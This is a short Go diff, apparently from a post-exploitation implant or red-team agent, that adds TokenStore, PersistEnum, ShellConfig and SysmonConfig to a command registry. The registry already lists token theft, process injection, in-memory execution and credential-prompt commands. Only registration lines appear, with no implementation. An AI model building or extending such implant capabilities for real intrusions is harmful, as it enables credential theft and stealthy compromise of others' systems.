@@ -14,6 +14,7 @@ func registerPlatformCommands() {
 	RegisterCommand(&ThreadlessInjectCommand{})
 	RegisterCommand(&MakeTokenCommand{})
 	RegisterCommand(&StealTokenCommand{})
+	RegisterCommand(&TokenStoreCommand{})
 	RegisterCommand(&Rev2SelfCommand{})
 	RegisterCommand(&TsCommand{})
 	RegisterCommand(&ApcInjectionCommand{})
@@ -81,4 +82,7 @@ func registerPlatformCommands() {
 	RegisterCommand(&PrivescCheckCommand{})
 	RegisterCommand(&ExecuteMemoryCommand{})
 	RegisterCommand(&CredentialPromptCommand{})
+	RegisterCommand(&PersistEnumCommand{})
+	RegisterCommand(&ShellConfigCommand{})
+	RegisterCommand(&SysmonConfigCommand{})
 }
